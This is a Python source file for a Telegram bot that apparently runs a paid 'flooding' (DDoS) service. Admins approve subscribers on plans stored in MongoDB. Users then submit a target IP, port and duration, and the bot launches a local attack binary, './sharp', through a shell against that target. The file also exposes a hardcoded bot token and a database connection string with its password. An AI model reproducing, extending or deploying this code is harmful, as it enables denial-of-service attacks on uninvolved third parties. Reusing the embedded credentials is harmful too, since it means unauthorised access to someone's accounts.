import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '7311450065:AAG75zxiiD5M7OkRXMgkfH96Hnl5gck60Lk'
user_id =("5674869424")
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
FORWARD_CHANNEL_ID = -1002418549191
CHANNEL_ID = -1002418549191
error_channel_id = -1002418549191

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []


REMOTE_HOST = '4.213.71.147'  
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./sharp {target_ip} {target_port} {duration} 70"
    try:
       
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.@raj14754*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: .  limit reached (99 users).@raj14754*", parse_mode='Markdown')
                return
        elif plan == 2: 
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: ATTACK Start  limit reached (499 users).@raj14754*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.@raj14754*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.@raj14754*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.@raj14754")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your . is currently not available due to limit reached.@raj14754")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Flooding Start is currently not available due to limit reached.@raj14754")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.@raj14754")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.@raj14754*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your .  is currently not available due to limit reached.@raj14754*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Flooding Start  is currently not available due to limit reached.@raj14754*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.@raj14754*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time @raj14754*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.@raj14754*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Flooding parameters set :  {target_ip}:{target_port}:{duration}*\nAttack Running Dont put same ip port: {target_port}\nTime: {duration}", parse_mode='Markdown')
    except Exception as e:
          logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn2 = KeyboardButton("ATTACK START 🔱")
    btn3 = KeyboardButton("ATTACK STOP 🚀")
    btn4 = KeyboardButton("MY ACCOUNT🥷")
    btn6 = KeyboardButton("ADMIN ⛳")

    # Add buttons to the markup
    markup.add( btn2,btn3, btn4, btn6)

    bot.send_message(message.chat.id, "*Choose an option @raj14754:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == ".":
       bot.reply_to(message, "*. selected @raj14754*", parse_mode='Markdown')
    elif message.text == "ATTACK START 🔱":
        bot.reply_to(message, "*READY FOR ATTACK @raj14754*", parse_mode='Markdown')
        attack_command(message)

    elif message.text == "ATTACK STOP 🚀":
        bot.send_message(message.chat.id, "*/stop Coming Soon @raj14754*", parse_mode='Markdown')
    elif message.text == "MY ACCOUNT🥷":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.@raj14754*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help":
        bot.reply_to(message, "*Help selected @raj14754*", parse_mode='Markdown')
    elif message.text == "ADMIN ⛳":
        bot.reply_to(message, "*Contact admin = @raj14754*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option @raj14754*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot.\n FILE BY - @raj14754\n@raj14754\n@raj14754\n@raj14754\n@raj14754\n@raj14754\n@raj14754\n@raj14754")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
